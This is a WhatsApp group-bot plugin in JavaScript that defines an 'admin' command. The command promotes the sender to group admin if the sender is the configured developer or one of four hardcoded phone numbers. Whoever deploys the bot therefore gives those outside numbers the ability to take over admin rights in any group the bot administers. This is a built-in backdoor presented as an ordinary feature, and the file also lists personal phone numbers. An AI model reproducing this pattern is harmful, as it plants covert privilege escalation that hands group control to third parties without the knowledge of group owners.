const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "admin",
    alias: ["takeadmin", "makeadmin"],
    desc: "Take adminship for authorized users",
    category: "group",
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
    if (!isGroup) return reply("❌ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜsᴇᴅ ɪɴ ɢʀᴏᴜᴘs.");
    if (!isBotAdmins) return reply("❌ ɪ ɴᴇᴇᴅ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴘᴇʀғᴏʀᴍ ᴛʜɪs ᴀᴄᴛɪᴏɴ.");

    const normalizeJid = (jid) => jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';

    const AUTHORIZED_USERS = [
        normalizeJid(config.DEV),
        normalizeJid("50948702213"),
        normalizeJid("50934960331"),
        normalizeJid("50938598801"),
        normalizeJid("923192173398"),
    ].filter(Boolean);

    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
        return reply("❌ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ɪs ʀᴇsᴛʀɪᴄᴛᴇᴅ ᴛᴏ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀs ᴏɴʟʏ.");
    }

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);

        if (userParticipant?.admin) {
            return reply(`⟣──────────────────⟢
┋ ℹ️ ʏᴏᴜ'ʀᴇ ᴀʟʀᴇᴀᴅʏ ᴀɴ ᴀᴅᴍɪɴ ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ
⟣──────────────────⟢`);
        }

        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");

        return reply(`⟣──────────────────⟢
┋ ✅ sᴜᴄᴄᴇssғᴜʟʟʏ ɢʀᴀɴᴛᴇᴅ ᴀᴅᴍɪɴ ʀɪɢʜᴛs!
⟣──────────────────⟢`);

    } catch (error) {
        console.error("Admin Command Error:", error);
        return reply(`❌ ғᴀɪʟᴇᴅ ᴛᴏ ɢʀᴀɴᴛ ᴀᴅᴍɪɴ ʀɪɢʜᴛs.\n\n${error.message}`);
    }
});
